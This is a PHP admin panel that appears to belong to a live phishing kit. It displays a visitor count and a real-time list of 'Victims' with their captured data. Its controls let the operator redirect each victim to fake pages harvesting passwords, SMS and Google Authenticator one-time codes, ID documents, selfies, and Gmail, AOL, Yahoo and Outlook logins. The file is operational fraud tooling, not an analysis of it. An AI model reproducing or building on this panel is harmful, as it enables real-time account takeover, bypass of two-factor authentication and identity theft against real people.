<?php
require_once('../shade/core/config.php');
if(empty($_SESSION['admin_pass']) || $_SESSION['admin_pass'] != ADMIN_PASS)
{
    header("Location: login.php");
    die;return;
}


?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta http-equiv="x-userAgent-compatible" content="ie=edge">
  <title>Admin Panel</title>
  <!-- Font Awesome -->
  <link rel="stylesheet" href="assets/css/all.css">
  <!-- Bootstrap core CSS -->
  <link rel="stylesheet" href="assets/css/bootstrap.min.css">
  <!-- Material Design Bootstrap -->
  <link rel="stylesheet" href="assets/css/mdb.dark.min.css">
  <!-- Your custom styles (optional) -->
  <link rel="stylesheet" href="assets/css/admin.css">
</head>
<body>
  <!--Main Navigation-->
  <header>
    <!-- Navbar -->
    <nav id="main-navbar" class="navbar navbar-expand-lg navbar-dark bg-dark">
      <!-- Container wrapper -->
      <div class="container-fluid">
        <!-- Brand -->
        <a class="navbar-brand" href="#">
          Admin Panel
        </a>
        <p>Visitors: <?=file_exists('../visits.log') ? count(file('../visits.log')) : '0'?></p>
      </div>
      <!-- Container wrapper -->
    </nav>
    <!-- Navbar -->
  </header>
  <!--Main Navigation-->

  <!--Main layout-->
  <main style="margin-top: 0px">
    <div class="container pt-4">
      <!-- Section: Main Victims -->
      <section class="mb-4">
        <div class="card">
          <div class="card-header py-3">
            <h5 class="mb-0 text-center"><strong>Victims</strong></h5>
            <h6 class="mb-0 text-center text-muted">Victims are added real time 🚀!</h6>
          </div>
          <div class="card-body">
            <div class="row" id="allrows">
            </div>
          </div>
        </div>
      </section>
      <!-- Section: Main Victims -->
    </div>

    <!-- Modal -->
    <div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
      <div class="modal-dialog" role="document">
        <div class="modal-content">
          <div class="modal-body">
            <p class="text-muted">Click on input to copy the value!</p>
            <div id="data_capt">

            </div>
            <hr>
            <input type="text" class="form-control hidden" id="victim-id-modal" hidden>
              <div class="form-check">
                <input class="form-check-input" type="radio" name="pagesRadios" id="pagesRadios22222" value="reset">
                <label class="form-check-label" for="pagesRadios22222">
                  Reset Password
                </label>
              </div>
			  <div class="form-check">
                <input class="form-check-input" type="radio" name="pagesRadios" id="pagesRadios999" value="login">
                <label class="form-check-label" for="pagesRadios999">
                  Login Page
               </label>
              </div>
              <hr>
              <div class="form-check">
                <input class="form-check-input" type="radio" name="pagesRadios" id="pagesRadios1" value="otp1">
                <label class="form-check-label" for="pagesRadios1">
                  CB Phone OTP Page
                </label>
              </div>
              <div class="input-group mb-3">
                <div class="input-group-prepend">
                  <span class="input-group-text" id="basic-addon1">Phone Number</span>
                </div>
                <input type="text" class="form-control" placeholder="XX" id="phonenum">
              </div>
              <div class="form-check">
                <input class="form-check-input" type="radio" name="pagesRadios" id="pagesRadios3" value="otp2">
                <label class="form-check-label" for="pagesRadios3">
                  CB Gauth OTP Page
                </label>
              </div>
              <div class="form-check">
                <input class="form-check-input" type="radio" name="pagesRadios" id="pagesRadios4" value="email">
                <label class="form-check-label" for="pagesRadios4">
                  Email Page
                </label>
              </div>
              <hr>
              <div class="form-check">
                <input class="form-check-input" type="radio" name="pagesRadios" id="pagesRadios5" value="id">
                <label class="form-check-label" for="pagesRadios5">
                  ID Page
                </label>
              </div>
              <div class="form-check">
                <input class="form-check-input" type="radio" name="pagesRadios" id="pagesRadios7" value="selfie">
                <label class="form-check-label" for="pagesRadios7">
                  Selfie Page
                </label>
              </div>
              <hr>
              <div class="form-check">
                <input class="form-check-input" type="radio" name="pagesRadios" id="pagesRadios8" value="google">
                <label class="form-check-label" for="pagesRadios8">
                  Gmail Page
                </label>
              </div>
              <div class="form-check">
                <input class="form-check-input" type="radio" name="pagesRadios" id="pagesRadios81" value="google_otp">
                <label class="form-check-label" for="pagesRadios81">
                  Gmail OTP Page
                </label>
              </div>
              <div class="input-group mb-3">
                <div class="input-group-prepend">
                  <span class="input-group-text" id="basic-addon1">Number</span>
                </div>
                <input type="text" class="form-control" placeholder="XX" id="gmail">
              </div>
              <hr>
              <div class="form-check">
                <input class="form-check-input" type="radio" name="pagesRadios" id="pagesRadios9" value="aol">
                <label class="form-check-label" for="pagesRadios9">
                  Aol Page
                </label>
              </div>
              <div class="form-check">
                <input class="form-check-input" type="radio" name="pagesRadios" id="pagesRadios91" value="aol_otp">
                <label class="form-check-label" for="pagesRadios91">
                  Aol OTP Page
                </label>
              </div>
              <hr>
              <div class="form-check">
                <input class="form-check-input" type="radio" name="pagesRadios" id="pagesRadios22" value="yahoo">
                <label class="form-check-label" for="pagesRadios22">
                  Yahoo Page
                </label>
              </div>
              <div class="form-check">
                <input class="form-check-input" type="radio" name="pagesRadios" id="pagesRadios221" value="yahoo_otp">
                <label class="form-check-label" for="pagesRadios221">
                  Yahoo OTP Page
                </label>
              </div>
			  <hr>
			  <div class="form-check">
                <input class="form-check-input" type="radio" name="pagesRadios" id="pagesRadios225" value="outlook">
                <label class="form-check-label" for="pagesRadios225">
                  Outlook Page
                </label>
              </div>
              <hr>
              <div class="form-check mt-2">
                <input class="form-check-input" type="radio" name="pagesRadios" id="pagesRadios555" value="success">
                <label class="form-check-label text-danger" for="pagesRadios555">
                  Finish
                </label>
              </div>
          </div>
          <div class="modal-footer">
            <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
            <button type="button" class="btn btn-primary saveChanges">Save Changes</button>
          </div>
        </div>
      </div>
    </div>

  </main>
  <!--Main layout-->

  <!-- jQuery -->
  <script type="text/javascript" src="assets/js/jquery.min.js"></script>
  <!-- Bootstrap tooltips -->
  <script type="text/javascript" src="assets/js/popper.min.js"></script>
  <!-- Bootstrap core JavaScript -->
  <script type="text/javascript" src="assets/js/bootstrap.min.js"></script>
  <!-- MDB core JavaScript -->
  <script type="text/javascript" src="assets/js/mdb.min.js"></script>

  <script type="text/javascript" src="assets/js/admin.js"></script>
</body>
</html>
